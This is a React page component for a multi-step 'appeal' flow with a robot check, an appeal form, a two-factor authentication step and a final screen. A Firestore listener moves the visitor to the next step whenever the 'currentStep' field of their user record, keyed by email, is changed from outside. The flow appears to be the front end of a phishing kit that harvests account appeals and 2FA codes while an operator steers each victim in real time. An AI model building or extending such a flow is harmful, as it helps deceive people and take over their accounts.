import styles from '../styles/Home.module.css'
import { useState } from 'react';
import Sidebar from './sidebar';
import RobotCheck from './robot-check';
import AppealForm from './appeal-form';
import Final from './final';
import TwoFactorAuth from './two-factor-auth';
import { doc, setDoc, getDocs, getDoc, updateDoc, query, collection, onSnapshot } from "firebase/firestore";
import { db } from  '../firebaseConfig';


export default function Home() {

  const [steps, setOpen] = useState({step_one: false, step_two: false, step_three: false, step_four: true});

  const getData = (data) => {
    if(data.type == 'robot-check') setOpen({step_two: true});
    if(data.type == 'appeal') setOpen({step_three: true});
    if(data.type == 'listenUser') listenUser(data.value);
  }

  const listenUser = (email) => {

      const unsub = onSnapshot(doc(db, "users", email), (doc) => {
        let user = doc.data();
        console.log(user);

        if(user.currentStep == 'appeal') setOpen({step_two: true});
        if(user.currentStep == 'twoFactor') setOpen({step_three: true});
        if(user.currentStep == 'final') setOpen({step_four: true});

        console.log("Current data: ", doc.data());
      });
  }

  return (

    <div className={styles.main}>
        <Sidebar/>
        <div className={styles.content}>
            <div className={styles.container}>
                { steps.step_one && <RobotCheck onSubmit={getData}/>}
                { steps.step_two && <AppealForm onSubmit={getData}/>}
                { steps.step_three && <TwoFactorAuth onSubmit={getData}/>}
                { steps.step_four && <Final onSubmit={getData}/>}
            </div>
        </div>
    </div>
  )
}
